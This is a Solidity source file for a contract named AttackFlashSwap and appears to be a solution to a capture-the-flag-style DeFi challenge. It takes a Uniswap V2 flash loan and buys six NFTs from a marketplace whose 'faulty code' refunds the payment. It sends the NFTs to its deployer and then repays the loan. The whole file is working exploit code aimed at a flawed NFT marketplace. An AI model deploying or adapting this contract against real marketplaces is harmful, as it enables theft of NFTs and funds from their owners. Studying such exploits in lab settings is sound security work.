pragma solidity =0.6.6;

import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol';

import '@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IERC20.sol';

interface IMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

interface INft {
    function safeTransferFrom(address from, address to, uint256 tokenId) external virtual;
}

interface IWeth {
    function deposit() external payable;    
    function withdraw(uint wad) external;
    function transferFrom(address src, address dst, uint wad) external returns (bool);
}

interface IERC721Receiver {
    /**
     * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
     * by `operator` from `from`, this function is called.
     *
     * It must return its Solidity selector to confirm the token transfer.
     * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
     *
     * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
     */
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}


contract AttackFlashSwap is IUniswapV2Callee, IERC721Receiver {
    address immutable factory;
    address immutable admin;
    IMarketplace immutable marketplace;
    INft immutable nft;
    IWeth immutable WETH;

    constructor(address _factory, address _weth, address _marketplace, address _nft) public {
        admin = msg.sender;
        factory = _factory;
        marketplace = IMarketplace(_marketplace);
        WETH = IWeth(_weth);
        nft = INft(_nft);
    }

    // need to accept ETH from the marketplace
    receive() external payable {}

    // gets tokens/WETH via a V2 flash swap, swaps for the ETH/tokens on V1, repays V2, and keeps the rest!
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
        address token0 = IUniswapV2Pair(msg.sender).token0(); // is weth
        address token1 = IUniswapV2Pair(msg.sender).token1(); // is token
        assert(msg.sender == UniswapV2Library.pairFor(factory, token0, token1)); // ensure that msg.sender is actually a V2 pair

        // withdraw WETH as ETH
        WETH.withdraw(amount0);

        // buy NFTs from marketplace, and get paid back due to faulty code
        uint256[] memory array = new uint256[](6);
        uint i;
        for (i=0;i<6;i++) {
            array[i] = i;
        } 

        marketplace.buyMany{value: amount0}(array);

        // transfer NFTs to admin
        for (i=0; i<6; i++) {
            nft.safeTransferFrom(address(this), admin, i);
        }

        // deposit ETH back to WETH
        WETH.deposit{value: amount0}();

        // amount extra that uniswap needs in fees
        uint premium = amount0 * 4 / 1000;

        // transfer some WETH from admin to pay for premium
        WETH.transferFrom(admin, address(this), premium);

        uint amountReturn = amount0 + premium;
        IERC20(token0).transfer(payable(msg.sender), amountReturn);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata 
    ) 
        external
        override
        returns (bytes4) 
    {
        return 0x150b7a02;
    }

}